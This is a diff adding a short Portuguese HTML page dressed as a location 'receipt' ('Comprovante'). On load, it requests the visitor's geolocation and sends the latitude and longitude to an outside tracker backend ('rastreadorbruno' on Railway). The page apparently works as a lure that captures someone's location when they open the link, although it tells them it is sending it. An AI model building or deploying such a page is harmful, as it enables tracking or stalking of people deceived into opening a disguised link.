@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante</title>
+  <style>
+    body {
+      background-color: antiquewhite;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h1>Comprovante de Localização</h1>
+  <p>Aguarde enquanto enviamos sua localização...</p>
+
+  <script>
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude:", latitude);
+      console.log("Longitude:", longitude);
+
+      // 🚀 Enviando para o backend no Railway
+      fetch("https://rastreadorbruno-production.up.railway.app/send-location", { 
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert("Localização enviada com sucesso!");
+        } else {
+          alert("Erro ao enviar localização.");
+        }
+      })
+      .catch(error => {
+        console.error("Erro ao enviar:", error);
+        alert("Erro de conexão. Tente novamente.");
+      });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
+  </script>
+</body>
+</html>
